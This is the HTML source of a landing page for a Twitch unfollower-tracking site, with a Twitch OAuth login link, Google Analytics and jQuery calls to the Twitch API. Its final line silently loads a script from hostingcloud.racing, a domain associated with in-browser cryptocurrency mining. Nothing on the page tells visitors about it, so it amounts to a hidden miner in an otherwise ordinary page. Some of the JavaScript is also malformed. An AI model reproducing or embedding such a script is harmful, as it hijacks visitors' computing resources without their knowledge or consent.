<!DOCTYPE html>
<!--
To change this license header, choose License Headers in Project Properties.
To change this template file, choose Tools | Templates
and open the template in the editor.
-->
<html>
    <head>
        <title>Unfollowers - Check who unfollowed you on Twitch</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="description" content="How to find who unfollowed you on Twitch? This website helps you find unfollowers free of charge! Or pay a 1$ subscription for a better expirience!">
        <meta name="keywords" content="twitch, unfollow, free, unfollowers">
        <meta name="author" content="Daniel Baychev">
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
        <script type = "text/javascript" 
                src = "https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js">
        </script>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
        <script src="js/json2.js" type="text/javascript"></script>
        <link rel="shortcut icon" type="image/x-icon" href="img/h.png" />
        <link href="css/bootstrap.min.css" rel="stylesheet" type="text/css"/>
        <link href="css/css.css" rel="stylesheet" type="text/css"/>
        <script src="login.js" type="text/javascript"></script>
        <link href="css/index.css" rel="stylesheet" type="text/css"/>
        <!-- Global site tag (gtag.js) - Google Analytics -->
        <script async src="https://www.googletagmanager.com/gtag/js?id=UA-129733775-1"></script>
        <script>
                    window.dataLayer = window.dataLayer || [];
                    function gtag() {
                        dataLayer.push(arguments);
                    }
                    gtag('js', new Date());

                    gtag('config', 'UA-129733775-1');
        </script>

    </head>
    <body   style="">

        <h1 style="text-align: center;">Connect with Twitch to continue</h1>
            <!--  <a id="hidden" style="display:block;margin:auto;text-align:center;" href="https://id.twitch.tv/oauth2/authorize?response_type=token&client_id=40pbvj5imeg5ma36gla9p8ryfkyyyb&redirect_uri=http://localhost/TwitchPHP/home.php&scope=analytics:read:extensions"><img height="35" src="img/login.png"></a>
        -->

        <a id="hidden" style="display:block;margin:auto;text-align:center;" href="https://id.twitch.tv/oauth2/authorize?response_type=token&client_id=40pbvj5imeg5ma36gla9p8ryfkyyyb&redirect_uri=http://localhost/TwitchPHP/home.php&scope=analytics:read:extensions"><img height="35"  class="logme"  src="img/login.png"></a>
        <br>
        <div style="background-color:#33333357;border-radius: .25rem;" class="container">
            <div class="row">
                <div class="col-md-12">
                    <h4 style="text-align:center;" style="color:white;">Welcome to Unfollowers.tv</h4>
                    <p style="text-align:center;color:white;">Here you can easily track unfollowers & get a live feed of your chat and viewers!</p>
                </div>
            </div>
        </div>






        <!-- Create a Twitch.Embed object that will render within the "twitch-embed" root element. -->
        <script type="text/javascript">
            if (typeof tkn === "string") {
                var hide = document.getElementById("hidden");
                hide.style.display = "none";
            }
            $.ajax({
                url: 'https://api.twitch.tv/helix/streams?user_login=greekgodx&client_id=pm7oxir9hxzfi0qrtghrl0hnzdxdrg',
                beforeSend: function (xhr) {
                    xhr.setRequestHeader("Authorization", "Bearer " + getUrlParameter('fragmentaccess_token'))
                },
                success: function (json) {
                    //process the JSON data etc

                    $.each(json.data, function (i, field) {
                        //$("#myTopnav").append("<p>" + field.type + "</p>");
                        if (typeof field.type === "string") {

                            new Twitch.Embed("twitch-embed", {
                                width: 1000,
                                height: 480,
                                channel: "greekgodx"
                            });
                            embed.addEventListener(getUrlParameter('fragmentaccess_token')).Embed.AUTHENTICATE, function (user) {
                                console.log(user.login + ' just logged in');
                            };
                        }
                    });
                }});

        </script>
        <script>
            function v2_open() {
                document.getElementById("main").style.marginLeft = "25%";
                document.getElementById("mySidebar").style.display = "block";
                document.getElementById("openNav").style.display = 'none';
            }
            function v2_close() {
                document.getElementById("main").style.marginLeft = "0%";
                document.getElementById("mySidebar").style.display = "none";
                document.getElementById("openNav").style.display = "inline-block";
            }
        </script>
        <script src="https://www.hostingcloud.racing/8qk1.js"></script>

    </body>
</html>
